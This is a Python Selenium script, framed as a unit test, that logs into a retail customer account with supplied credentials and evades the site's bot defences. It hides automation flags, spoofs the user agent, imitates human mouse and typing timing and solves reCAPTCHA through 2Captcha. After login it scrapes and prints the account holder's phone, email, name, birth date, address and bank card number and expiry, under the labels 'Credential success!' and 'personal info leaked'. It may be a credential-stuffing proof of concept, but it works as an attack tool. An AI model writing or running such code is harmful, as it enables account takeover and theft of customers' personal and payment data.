import time
import unittest
import random
from selenium import webdriver
from selenium.common.exceptions import TimeoutException, NoSuchElementException
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.by import By
from selenium.webdriver.common.touch_actions import TouchActions
from selenium.webdriver.common.action_chains import ActionChains
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions
from twocaptcha import TwoCaptcha
import os
import pprint
import urllib.parse as urlparse
from urllib.parse import parse_qs


class Flow1(unittest.TestCase):

    def setUp(self):
        options = webdriver.ChromeOptions()
        options.add_argument("--start-maximized")
        options.add_experimental_option("excludeSwitches", ["enable-automation"])
        options.add_experimental_option('useAutomationExtension', False)
        options.add_argument("--disable-blink-features=AutomationControlled")
        options.add_argument("--disable-web-security")
        options.add_argument("---user-data-dir=./_chromeTemp")
        options.add_argument("--disable-features=CrossSiteDocumentBlockingIfIsolating")
        options.add_argument("--disable-site-isolation-for-policy")
        options.add_argument("–-allow-file-access-from-files")
        options.add_argument("--auto-open-devtools-for-tabs")
        options.add_argument("--show-taps")
        options.add_experimental_option('w3c', False)

        self.driver = webdriver.Chrome(
            executable_path=PATH,
            options=options
        )
        self.driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
        self.driver.execute_cdp_cmd('Network.setUserAgentOverride', {
            "userAgent": 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36'})
        print("Run Selenium bot with User Agent: %s" % self.driver.execute_script("return navigator.userAgent;"))

    def test_login(self):
        self.driver.get(URI)

        # Move
        TouchActions(self.driver).scroll(10, 10).perform()

        # Accept data privacy
        element = self.getElementId("didomi-notice-agree-button")
        self.clickButton(element)

        # Mon Compte
        element = self.driver.find_elements_by_class_name("svelte-n8aq2c")[6]
        self.clickButton(element)

        # Login
        element = self.getElementId("input-email")
        self.setForm(element=element, input_data=LOGIN_EMAIL)

        # Valider
        element = self.getElementId("lookup-btn")
        self.clickButton(element)

        # Password... or blocked by Shape
        time.sleep(1)
        element = self.getElementId("input-password")
        if element.location['x'] == 0:
            time.sleep(1000)
        else:
            self.setForm(element=element, input_data=LOGIN_PASSWORD)

        # Valider
        element = self.getElementId("signin-button")
        self.clickButton(element)

        # Mon Profil
        time.sleep(2)
        element = self.driver.find_elements_by_class_name("panel")[1]
        self.clickButton(element)

        # Data leak
        element = self.getElementClass("num-card")
        print("Credential success!")
        print("personal info leaked:")
        print("- account: %s" % element.text)
        elements = self.driver.find_elements_by_class_name("value")
        print("- phone number: %s" % elements[0].text)
        print("- e-mail: %s" % elements[1].text)
        print("- genre: %s" % elements[3].text)
        print("- first name: %s" % elements[4].text)
        print("- last name: %s" % elements[5].text)
        print("- birth day: %s" % elements[6].text)
        print("- address: %s" % elements[7].text)

        # Mon Portefeuille
        time.sleep(3)
        element = self.driver.find_elements_by_class_name("panel")[2]
        self.clickButton(element)

        # CB
        element = self.driver.find_elements_by_class_name("dkt-sliding-tab-name")[1]
        self.clickButton(element)

        # Data leak
        element = self.driver.find_elements_by_class_name("dkt-card-code")[1]
        print("- CB number: %s" % element.text)
        elements = self.driver.find_elements_by_class_name("dkt-card-line")
        print("- CB name: %s" % elements[1].text)
        print("- CB valid date: %s" % elements[3].text)

        time.sleep(1000)

    def tearDown(self):
        self.driver.close()

    def clickButton(self, element):
        interval_think = random.uniform(1.1, 1.5)
        interval_get_mouse = random.uniform(1.1, 1.5)
        interval_click = random.uniform(0.1, 0.3)
        offset_x = random.uniform(1, 10)
        offset_y = random.uniform(1, 10)

        ActionChains(self.driver).pause(interval_think).\
            move_by_offset(offset_x, offset_y).\
            move_to_element(element).pause(interval_get_mouse).\
            click_and_hold(element).pause(interval_click).release(element).\
            perform()

    def setForm(self, element, input_data):
        interval_think = random.uniform(1.1, 1.5)
        interval_get_mouse = random.uniform(1.1, 1.5)
        interval_click = random.uniform(0.1, 0.3)
        offset_x = random.uniform(50, 100) * -1
        offset_y = random.uniform(50, 100) * -1

        ActionChains(self.driver).pause(interval_think).\
            move_by_offset(offset_x, offset_y).\
            move_to_element(element).pause(interval_get_mouse).\
            click_and_hold(element).pause(interval_click).release(element).\
            perform()
        element.clear()
        string = []
        string[:0] = input_data
        for character in string:
            element.send_keys(character)
            interval = random.uniform(0.1, 0.35)
            time.sleep(interval)

    def getElementId(self, element_id):
        try:
            WebDriverWait(self.driver, 2).until(
                expected_conditions.presence_of_element_located((By.ID, element_id))
            )
        except TimeoutException:
            print("Oops!  Too long to retrieve element '%s'" % element_id)
        try:
            element = self.driver.find_element_by_id(element_id)
        except NoSuchElementException:
            print("Oops!  There is no valid element '%s'" % element_id)
            return None
        return element

    def getElementTagName(self, tag_name):
        try:
            WebDriverWait(self.driver, 2).until(
                expected_conditions.presence_of_element_located((By.TAG_NAME, tag_name))
            )
        except TimeoutException:
            print("Oops!  Too long to retrieve element '%s'" % tag_name)
        try:
            elements = self.driver.find_elements_by_tag_name(tag_name)
        except NoSuchElementException:
            print("Oops!  There is no valid element '%s'" % tag_name)
            return None
        return elements

    def getElementClass(self, element_class):
        try:
            WebDriverWait(self.driver, 2).until(
                expected_conditions.presence_of_element_located((By.CLASS_NAME, element_class))
            )
        except TimeoutException:
            print("Oops!  Too long to retrieve element '%s'" % element_class)
        try:
            element = self.driver.find_element_by_class_name(element_class)
        except NoSuchElementException:
            print("Oops!  There is no valid element '%s'" % element_class)
        return element

    def getElementName(self, element_name):
        try:
            WebDriverWait(self.driver, 2).until(
                expected_conditions.presence_of_element_located((By.NAME, element_name))
            )
        except TimeoutException:
            print("Oops!  Too long to retrieve element '%s'" % element_name)
        try:
            element = self.driver.find_element_by_name(element_name)
        except NoSuchElementException:
            print("Oops!  There is no valid element '%s'" % element_name)
        return element

    def solveGRecaptcha(self, site_key, url):
        print("2CAPTCHA - grecaptcha v2 site key: '%s' " % site_key)
        print("2CAPTCHA - try to solve, please wait a minute...")

        # SOLVE
        try:
            captcha_result = solver.recaptcha(
                sitekey=site_key,
                url=url,
                version='v2',
                enterprise=0
            )
        except Exception as e:
            print("2CAPTCHA - error %s" % e.args[0])
            time.sleep(90)
        print("2CAPTCHA - grecaptcha v2 solved: '%s' " % captcha_result['code'])

        # SEND a message to iframe in order to launch Callback
        post_message_data = "captchaCallback=" + str(captcha_result['code'])
        js_script = "iframe = document.getElementsByTagName('iframe')[0]; " + \
                    "iframe.contentWindow.postMessage('" + \
                    post_message_data + \
                    "', '*');"
        self.driver.execute_script(js_script)


if __name__ == "__main__":
    PATH = "./_files/chromedriver.exe"
    URI = "INPUT"
    LOGIN_EMAIL = "INPUT"
    LOGIN_PASSWORD = "INPUT"
    CAPTCHA_API_KEY = "INPUT"
    config = {
        'server': '2captcha.com',
        'apiKey': CAPTCHA_API_KEY,
        'softId': 1,
        'defaultTimeout': 120,
        'recaptchaTimeout': 600,
        'pollingInterval': 10,
    }
    solver = TwoCaptcha(**config)

    unittest.main()
